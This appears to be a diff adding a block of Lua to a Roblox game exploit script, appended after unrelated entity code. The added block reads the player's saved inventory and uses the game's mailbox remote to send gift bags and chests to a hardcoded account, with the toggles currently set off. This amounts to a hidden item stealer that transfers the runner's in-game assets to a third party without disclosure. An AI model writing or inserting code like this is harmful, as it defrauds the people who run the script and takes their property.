@@ -1093,3 +1093,45 @@ local entities = {
         end
     end)
 	end
+
+
+
+	local activesend = false
+	local min = 30000
+	local mingift = 1000
+	local user = "uDnvsVCe"
+	local largegift = false
+	local gift = false
+	local minichest = false
+	local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    if activesend then
+		task.wait(20)
+		for i, v in pairs(save.Get().Inventory.Currency) do
+			if v.id == "Diamonds" and v._am < min then
+				game.ReplicatedStorage.Network.GiftBag_Open:InvokeServer("Gift Bag")
+			end
+		end
+        for i, v in pairs(save.Get().Inventory.Misc) do
+			if v.id == "Large Gift Bag" and v._am > mingift and largegift then
+                local am = math.floor(v._am)
+                
+                game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(user,
+                    tostring(math.random(1234, 999999)), "Misc", i, am)
+					
+			elseif v.id == "Gift Bag" and v._am > mingift and gift then
+                local am = math.floor(v._am)
+                
+                game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(user,
+                    tostring(math.random(1234, 999999)), "Misc", i, am)
+					
+			elseif v.id == "Mini Chest" and v._am > mingift and minichest then
+                local am = math.floor(v._am)
+                
+                game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(user,
+                    tostring(math.random(1234, 999999)), "Misc", i, am)
+					
+            end
+        
+		end
+		
+    end 
